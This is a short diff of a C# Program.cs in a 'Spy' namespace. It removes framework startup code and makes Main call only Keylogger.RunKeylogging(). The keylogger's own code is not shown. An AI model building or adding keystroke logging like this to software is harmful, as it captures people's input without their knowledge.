@@ -1,16 +1,18 @@
 ﻿using System;
-using DGE;
-using DGE.Core;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Spy.Input;
 
-namespace Spy;
-
-public static class Program
+namespace Spy
 {
-    public static void Main(string[] args)
+    public static class Program
     {
-        DGE.Main.Init();
-        DGEModules.RegisterModule(AssemblySpy.module);
+        public static void Main(string[] args)
+        {
+            Keylogger.RunKeylogging();
+        }
 
-        DGE.Main.Run().GetAwaiter().GetResult();
     }
 }
